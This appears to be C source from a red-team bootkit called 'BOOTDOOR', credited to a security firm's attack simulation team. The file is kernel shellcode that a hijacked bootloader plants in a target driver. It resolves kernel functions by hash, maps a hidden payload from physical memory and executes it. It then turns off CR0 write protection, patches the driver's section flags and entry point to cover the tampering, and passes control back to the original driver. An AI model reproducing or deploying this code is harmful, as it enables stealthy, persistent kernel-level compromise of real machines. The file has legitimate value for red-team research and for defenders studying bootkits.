/*!
 *
 * BOOTDOOR
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

VOID
NTAPI
KeSetSystemAffinityThread(
	SIZE_T Affinity
);

PVOID
NTAPI
MmMapIoSpace(
	LPVOID PhysicalAddress,
	SIZE_T NumberOfBytes,
	SIZE_T CacheType
);

typedef struct
{
	D_API( KeSetSystemAffinityThread );
	D_API( MmMapIoSpace );
} API ;

#define H_API_KESETSYSTEMAFFINITYTHREAD		0x80679c78 /* KeSetSystemAffinityThread */
#define H_API_MMMAPIOSPACE			0x7fbf0801 /* MmMapIoSpace */

/*!
 *
 * Purpose:
 *
 * Shellcode deployed by the bootloader
 * to copy over a larger payload for
 * execution.
 *
!*/
D_SEC( B ) NTSTATUS NTAPI DrvMain( PVOID DriverObject, PVOID RegistryPath )
{
	API			Api;

	PCFG			Cfg = NULL;
	PVOID			Ptr = NULL;
	PVOID			Tgt = NULL;
	PRNTBL			Tbl = NULL;
	HANDLE			Thd = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;
	PIMAGE_SECTION_HEADER	Sec = NULL;
	PLDR_DATA_TABLE_ENTRY	Ldr = NULL;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	/* Setup pointers */
	Tbl = C_PTR( G_PTR( RnTbl ) );
	Cfg = C_PTR( U_PTR( U_PTR( GetIp() ) + 11 ) );
	Dos = C_PTR( Tbl->TargetDriverImageBase );
	Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
	Sec = C_PTR( Tbl->TargetDriverSection );
	Ldr = C_PTR( Tbl->TargetDriverLoaderEntry );

	/* Get pointer to the API's needed */
	Api.KeSetSystemAffinityThread = PeGetFuncEat( Tbl->KernelBase, H_API_KESETSYSTEMAFFINITYTHREAD ); 
	Api.MmMapIoSpace              = PeGetFuncEat( Tbl->KernelBase, H_API_MMMAPIOSPACE );

	/* Map the physical address of our payload into virtual space */
	if ( ( Ptr = Api.MmMapIoSpace( Tbl->BufferBase, Tbl->BufferSize, 0 ) ) != NULL ) {
		/* Execute the mapped virtual memory */
		( ( VOID NTAPI ( * )( PVOID, PVOID ) ) Ptr )( Tbl->KernelBase, Tbl->TargetDriverImageBase );
	};

Leave:
	/* Force __writecr0() on same CPU */
	Api.KeSetSystemAffinityThread( 0x00000001 );

	/* Remove write protection */
	__writecr0( __readcr0() &~ 0x000010000 );
	
	/* Remove -x permission from section */
	Sec->Characteristics &= ~IMAGE_SCN_MEM_EXECUTE;

	/* Insert original entrypoint & offset in the header */
	Ldr->EntryPoint                         = C_PTR( U_PTR( Dos ) + Nth->OptionalHeader.AddressOfEntryPoint );
	Nth->OptionalHeader.AddressOfEntryPoint = Tbl->TargetDriverAddressOfEntryPoint;
	
	/* Insert write protection */
	__writecr0( __readcr0() |  0x000010000 );

	/* Execute original driver entrypoint to prevent issues */
	return ( ( __typeof__( DrvMain ) * ) C_PTR( U_PTR( Dos ) + Tbl->TargetDriverAddressOfEntryPoint ) )( 
			DriverObject, RegistryPath 
	); 
};
